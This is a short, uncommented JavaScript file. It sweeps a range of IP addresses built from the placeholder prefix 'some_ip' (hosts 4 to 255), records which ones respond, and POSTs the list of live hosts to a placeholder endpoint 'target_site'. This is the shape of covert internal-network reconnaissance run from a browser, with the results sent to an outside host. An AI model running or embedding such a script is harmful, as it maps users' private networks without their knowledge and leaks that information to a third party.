
const result_arr = []

function generateIPList() {
    var ipUrlPrefix = 'some_ip'
    var ipUrl;
    var ipArr = [];
    for (let index = 4; index < 256; index++) {
        ipUrl = ipUrlPrefix + index
        ipArr.push(ipUrl);
    }
    return ipArr
}

function processIps() {
    const ipList = generateIPList();

    Promise.all(ipList.map(url =>
        fetch(url)
        .then(resp => resp.text())
        .then(data => result_arr.push(url))
        .catch((e) => {
            
        })
    )).then(texts => {
        return fetch('target_site', {
                method: 'POST',
                body: result_arr
            })
            .then(response => response.json())
            .then(console.log)
    })
}

async function main() {
    processIps()
}

main();
